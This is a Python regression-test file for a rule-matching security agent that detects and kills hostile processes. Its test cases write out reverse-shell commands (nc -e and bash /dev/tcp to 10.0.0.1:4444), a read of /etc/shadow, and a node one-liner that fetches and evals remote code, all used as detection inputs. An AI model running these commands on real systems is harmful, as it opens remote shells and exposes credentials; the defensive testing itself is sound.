#!/usr/bin/env python3
"""Rule-matching regression tests.

Locks in the behaviour that mattered in the hardening pass:
  * Attack command lines still match (rules 1001 / 1002 / 3001).
  * Benign binaries are not KILLed (the "msgfmt / node / nginx" false-kill bug).
  * A trusted binary running a command-line rule is still enforced.
  * Trusted binaries are exempt from identity (binary-name) rules only.

Drives the real agent module with bcc stubbed, so it needs no kernel access.

Run: python3 tests/test_rule_matching.py
"""
import os
import sys
import types
import unittest
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent

# Stub bcc before importing the agent (agent does `from bcc import BPF`).
_bcc = types.ModuleType("bcc")
_bcc.BPF = object
_bcc_utils = types.ModuleType("bcc.utils")
_bcc_utils.printb = lambda *a, **k: None
sys.modules.setdefault("bcc", _bcc)
sys.modules.setdefault("bcc.utils", _bcc_utils)

sys.path.insert(0, str(REPO / "agent"))
os.environ.setdefault("SENTINEL_CONFIG", str(REPO / "config" / "rules.yaml"))

import sentinel_lineage_agent as A  # noqa: E402

BENIGN_BINARIES = [
    "msgfmt", "node", "nginx", "ls", "ps", "top", "find", "bash", "sh",
    "cat", "cp", "dd", "grep", "awk", "sed", "touch", "uname", "ssh",
    "tar", "python3", "curl", "systemctl", "insmod", "nmap", "kubectl",
    "docker", "sg", "vim", "nano", "chmod", "whoami", "id", "env",
]


def _entry(binary, cmdline, uid=1000, flags=0):
    return A.LineageEntry(
        lineage_id=0x1111, parent_lineage_id=0, pid=1000, ppid=1, uid=uid,
        gid=uid, ns_pid=1000, comm=os.path.basename(binary),
        binary_path=binary, cmdline=cmdline, exec_timestamp=0.0, flags=flags)


def _first_match(e):
    for r in A.rules:
        if A.match_rule(e, r):
            return r
    return None


class TestRuleMatching(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        A.load_rules()

    def test_rules_loaded(self):
        self.assertGreater(len(A.rules), 50)

    def test_attack_cmdlines_match(self):
        cases = [
            ("/usr/bin/nc", "nc -e /bin/bash 10.0.0.1 4444", 1001),
            ("/bin/bash", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", 1002),
            ("/usr/bin/cat", "cat /etc/shadow", 3001),
        ]
        for binary, cmdline, want in cases:
            with self.subTest(cmdline=cmdline):
                m = _first_match(_entry(binary, cmdline))
                self.assertIsNotNone(m, f"no rule matched {cmdline!r}")
                self.assertEqual(m.id, want)

    def test_benign_binaries_are_not_enforced(self):
        """Regression: msgfmt / node / nginx were falsely KILLed."""
        offenders = []
        for b in BENIGN_BINARIES:
            m = _first_match(_entry(f"/usr/bin/{b}", b))
            if m is not None and m.action in ("KILL", "BLOCK", "QUARANTINE"):
                offenders.append((b, m.id, m.action))
        self.assertEqual(offenders, [], f"benign binaries enforced: {offenders}")

    def test_trusted_identity_rules_exempt(self):
        e = _entry("/usr/bin/nginx", "nginx", flags=A.LF_TRUSTED)
        m = _first_match(e)
        self.assertTrue(m is None or not (m.flags & A.RF_CMDLINE))

    def test_trusted_binary_still_enforced_for_cmdline_rules(self):
        """A trusted bash running a reverse shell must not be exempt."""
        e = _entry("/bin/bash", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
                   flags=A.LF_TRUSTED)
        m = _first_match(e)
        self.assertIsNotNone(m)
        self.assertEqual(m.id, 1002)
        self.assertTrue(m.flags & A.RF_CMDLINE)
        exempt = (e.flags & A.LF_TRUSTED) and not (m.flags & A.RF_CMDLINE)
        self.assertFalse(exempt, "trusted bash + revshell was wrongly exempted")

    def test_binary_pattern_matches_name_not_path_substring(self):
        """'node' must not match /usr/bin/msgfmt, and path position must not matter."""
        self.assertIsNone(_first_match(_entry("/usr/bin/msgfmt", "msgfmt")))
        # a binary named node IS matched by rule 2006 only with the right cmdline
        m = _first_match(_entry("/usr/bin/node", "node -e \"fetch('http://x').then(eval)\""))
        self.assertIsNotNone(m)


if __name__ == "__main__":
    unittest.main(verbosity=2)
